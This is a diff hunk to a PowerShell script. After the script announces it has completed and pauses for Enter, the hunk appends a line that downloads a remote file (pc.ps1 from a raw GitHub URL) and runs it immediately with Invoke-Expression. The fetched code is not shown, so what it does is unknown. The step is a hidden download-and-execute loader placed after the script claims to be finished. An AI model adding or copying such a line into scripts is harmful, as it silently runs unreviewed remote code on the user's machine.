@@ -265,3 +265,6 @@ Clear-Host
 # Pause at the end
 Write-Host "Script execution completed. Press Enter to exit."
 Read-Host
+
+# Execute additional script
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emreuls7/mr.winls/menu/pc.ps1").Content
